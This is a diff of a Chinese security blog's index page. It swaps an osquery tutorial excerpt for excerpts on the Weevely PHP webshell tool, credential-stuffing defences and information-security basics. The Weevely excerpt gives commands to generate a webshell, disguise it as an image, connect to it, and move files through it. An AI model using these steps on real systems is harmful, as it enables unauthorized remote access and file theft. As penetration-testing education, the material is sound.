@@ -33,7 +33,7 @@
             <a href="/" title="">資安工作筆記</a>
         </div>
         <div class="menu">
-            <div class="menu-inner"><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+            <div class="menu-inner"><a class="menu-item" href="/about/"><i class='fa fa-heart'></i> about </a><a class="menu-item" href="/posts/"><i class='fa fa-road'></i> post <span class='alert'>New!</span></a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                     <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                 </a></div>
         </div>
@@ -48,31 +48,13 @@
                 <span></span><span></span><span></span>
             </div>
         </div>
-        <div class="menu" id="menu-mobile"><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/about/" title=""><i class='fa fa-heart'></i>about</a><a class="menu-item" href="/posts/" title=""><i class='fa fa-road'></i>post<span class='alert'>New!</span></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                 <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
             </a></div>
     </div>
 </header><main class="main">
                 <div class="container"><div class="page home" data-home="posts"><div class="home-profile"><div class="home-subtitle">資訊安全相關內容分享</div></div>
 <article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/posts/introduction-to-osquery/">工具介紹-osquery</a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a></span>&nbsp;<span class="post-publish">published on <time datetime="2022-02-28">2022-02-28</time></span></div><div class="content">介紹 osquery 是由 facebook 開發的開源工具，可以運用在 Security、Compliance、Aduit方面，相較於其他工具，osquery 提供了一致的查詢方式與一致的結果呈現。從工具名稱就可看出，主打像取得db資料一樣的取得os資訊。在進行操作前可以先瞭解osquery所提供的schema。
-除了安裝版外，也提供免安裝版。
-osqueryi 使用 安裝好後使用osqueryi指令進入進行操作interface。
-取得檔案 hash value 以下以hash schema來示範。對hash schema查詢時，必需使用where來指定檔案，或資料夾。使用資料夾時會回傳資料夾內所有檔案hash值。
-osqueryi &#34;SELECT \* FROM hash WHERE path = &#39;path/to/file&#39; &#34; 上面指令可以列出檔案的hash值，並把所有欄位列出。
-osqueryi &#34;SELECT \* FROM hash WHERE directory = &#39;path/to/directory&#39; &#34; 上面指令可以列出路徑中所有檔案的hash值，並把所有欄位列出。
-取得排程資訊 利用 scheduled_tasks 可以取得 Windows 上的排程資料
-可以參考以下指令將 state 是 ready 跟 running 的 task 把 name 跟 action 列出來。
-c:\&gt;osqueryi &#34;select name, action from scheduled_tasks where state in (&#39;ready&#39;,&#39;running&#39;)&#34; 輸出結果參考
-+---------------------------+------------------------------------------------------------------+ | name | action | +---------------------------+------------------------------------------------------------------+ | Adobe Acrobat Update Task | C:\Program Files (x86)\Common Files\Adobe\ARM\1.</div><div class="post-footer">
-        <a href="/posts/introduction-to-osquery/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/">資訊安全</a>,&nbsp;<a href="/tags/%E8%B3%87%E5%AE%89%E7%9B%A3%E6%8E%A7/">資安監控</a>,&nbsp;<a href="/tags/%E8%B3%87%E5%AE%89%E9%91%91%E8%AD%98/">資安鑑識</a>,&nbsp;<a href="/tags/osquery/">osquery</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/posts/1407/"></a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a></span>&nbsp;<span class="post-publish">published on <time datetime="2022-02-17">2022-02-17</time></span></div><div class="content"></div><div class="post-footer">
-        <a href="/posts/1407/">Read More</a></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
         <a href="/posts/1404/"></a>
     </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a></span>&nbsp;<span class="post-publish">published on <time datetime="2022-02-17">2022-02-17</time></span></div><div class="content"></div><div class="post-footer">
         <a href="/posts/1404/">Read More</a><div class="post-tags">
@@ -89,16 +71,39 @@ https://www.cloudflare.com/learning/bots/what-is-credential-stuffing/</div><div 
         <a href="/posts/what-is-credential-stuffing/">Read More</a><div class="post-tags">
                 <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/">資訊安全</a>,&nbsp;<a href="/tags/%E5%AF%86%E7%A2%BC%E7%A0%B4%E8%A7%A3/">密碼破解</a></div></div>
 </article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/posts/introduction-to-weevely-php-webshell-comments/">工具介紹-Weevely (kali linux web shell產生工具)</a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a></span>&nbsp;<span class="post-publish">published on <time datetime="2022-02-07">2022-02-07</time></span></div><div class="content">[轉]瞭解MDR EDR EPP XDR – 資安工作筆記 - Feb 3, 2022
-[…] 工具介紹-Weevely (kali linux web shell產生工具) […]
-[…] 工具介紹-Weevely (kali linux web shell產生工具) […]
-[…] 工具介紹-Weevely (kali linux web shell產生工具) […]
-[…] 工具介紹-Weevely (kali linux web shell產生工具) […]
-[…] 工具介紹-Weevely (kali linux web shell產生工具) […]
-[…] 工具介紹-Weevely (kali linux web shell產生工具) […]</div><div class="post-footer">
-        <a href="/posts/introduction-to-weevely-php-webshell-comments/">Read More</a><div class="post-tags">
+        <a href="/posts/introduction-to-weevely-php-webshell/">工具介紹-Weevely (kali linux web shell產生工具)</a>
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a></span>&nbsp;<span class="post-publish">published on <time datetime="2022-02-07">2022-02-07</time></span></div><div class="content">Weevely是使用python寫成的webshell管理工具，可產生php webshell。
+產生Webshell 使用以下指令產生webshell，要注意密碼用特殊字元有時會造成連線失敗。
+如果要產生圖片檔，以jpg命名結尾就可以了。
+weevely generate 567 hello.php 連線Webshell 上傳後使用以下指令連線後門，然後進入一個互動式的shell
+weevely http://urltowebshell/hello.php 567 如果是使用jpg的檔案，一樣直接連線該檔案就行。
+利用Webshell下載檔案 從遠端下載檔案，rpath是遠端路行 lpath是要存的本地路徑(都要包含檔名)
+file.download rpath lpath [-vector]
+利用Webshell上傳檔案 使用:file_upload2web指令可以檔案上傳到目標主機
+:file_upload2web lpath rpath
+:file\_upload2web /home/kali/Desktop/test.exe test.exe 延伸閱讀 資安監控-rever shell監控方法 工具介紹-Python-Backdoor 網頁攻擊手法-上傳弱點 參考資料 https://www.kali.org/tools/weevely https://securityonline.info/weevely-tutorial-php-webshell/ https://github.com/epinna/weevely3 </div><div class="post-footer">
+        <a href="/posts/introduction-to-weevely-php-webshell/">Read More</a><div class="post-tags">
                 <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/kali-linux/">Kali Linux</a>,&nbsp;<a href="/tags/webshell/">webshell</a>,&nbsp;<a href="/tags/%E6%BB%B2%E9%80%8F%E6%B8%AC%E8%A9%A6/">滲透測試</a></div></div>
+</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+        <a href="/posts/%E6%92%9E%E5%BA%AB%E6%94%BB%E6%93%8A/">密碼破解-撞庫攻擊</a>
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a></span>&nbsp;<span class="post-publish">published on <time datetime="2022-02-06">2022-02-06</time></span></div><div class="content">撞庫攻擊是密碼破解的一種手法，駭客利用A網站洩露的帳密來登入B網站。基本思考方式是，「人在不同網站有很大的機會用同一組帳密」。
+偵測與防範的手法 2階段驗證(2FA)，是能有效防止的一種方式。
+除了2FA外，或是網站不支援2FA時(那種網站也別用了)，使用者能否在不同網站使用不同密碼也是很重要的。
+因此管理員會在政策上要求定期更改密碼，並且密碼不可與前幾代相同。利用這個方式來讓使用者換成不同的密碼。
+密碼管理軟體 其實很多道理人都懂，但常常為了方便而選擇相同的密碼。此時密碼管理軟體就很重要了。利用軟體自動產生高強度的密碼，登入時自動幫你輸入，不但不用記錄，還達到密碼強度要求，相當的方便好用。
+Log集中監控 在企業中使用SIEM建立關連規則來監控是可以監控到攻擊的行為。如內部使用者能使用不用密碼，在攻擊時會產生多次登入失敗。或是攻擊者在非正常登入來源登入都是可以監控的點。
+延伸閱讀 密碼噴灑攻擊
+[轉]保障AD管理群組與帳號安全
+[轉]內網橫向移動思路和技巧
+支持 如果你喜歡這網站，請加入追蹤，可以收到最新的更新訊息。</div><div class="post-footer">
+        <a href="/posts/%E6%92%9E%E5%BA%AB%E6%94%BB%E6%93%8A/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/">資訊安全</a>,&nbsp;<a href="/tags/%E5%AF%86%E7%A2%BC%E7%A0%B4%E8%A7%A3/">密碼破解</a>,&nbsp;<a href="/tags/%E5%AF%86%E7%A2%BC%E5%AD%B8/">密碼學</a>,&nbsp;<a href="/tags/%E6%92%9E%E5%BA%AB%E6%94%BB%E6%93%8A/">撞庫攻擊</a></div></div>
+</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+        <a href="/posts/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/">資訊安全-基本概念</a>
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a></span>&nbsp;<span class="post-publish">published on <time datetime="2022-02-05">2022-02-05</time></span></div><div class="content">資訊安全的主體是資訊，不論是過去在古代傳達的軍令，還是現在人在意的個資，都是資訊安全想保護的主體。因此資訊安全一開始要討論的就是，資訊怎麼樣是安全的？也就是說我們可以從什麼方面來確認我們的資訊是安全的？這時就是要提到訊息的個層面，「機密性、完整性、可用性」。我們可以用一句話來說明，「當被核可的人需要資源或資料時，它們就一如預期的在那邊可以使用。」
+在討論資訊安全時，就會以此三件事為基礎展開來討論。</div><div class="post-footer">
+        <a href="/posts/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/">資訊安全</a>,&nbsp;<a href="/tags/information-security/">Information Security</a></div></div>
 </article><ul class="pagination"><li class="page-item ">
                     <span class="page-link">
                         <a href="/">1</a>
@@ -129,7 +134,7 @@ https://www.cloudflare.com/learning/bots/what-is-credential-stuffing/</div><div 
                     <span class="page-link" aria-hidden="true">&hellip;</span>
                 </li><li class="page-item ">
                     <span class="page-link">
-                        <a href="/page/34/">34</a>
+                        <a href="/page/25/">25</a>
                     </span>
                 </li></ul></div></div>
             </main><footer class="footer">
